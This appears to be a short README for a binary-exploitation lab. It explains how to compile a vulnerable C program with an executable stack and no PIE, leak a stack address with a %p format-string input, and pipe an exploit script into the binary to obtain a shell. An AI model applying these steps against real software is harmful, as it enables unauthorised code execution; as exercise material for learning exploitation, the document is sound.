Compile `main.c` with :
```
gcc main.c -o vuln -z execstack -no-pie
```
To find the `buf_val` value in `exploit.py`, you have to use `printf()` vulnerability, so in the vulnerable program `vuln`, you have to enter `%p,%p,%p,%p,%p,%p` or more `%p,`, it should give you some values, the value we're looking for should be something like `0x7fffffffde20` (if it's compiled in 64 bits), it is generaly the second or the 4th value
Now you just have to take this value, and place it in the value of `buf_val` of `exploit.py`, then to run the exploit
```
python exploit.py | ./vuln
```
But you should see that the shell closes immediatly, so you have to use cat to keep it open
```
(python exploit.py ; cat) | ./vuln
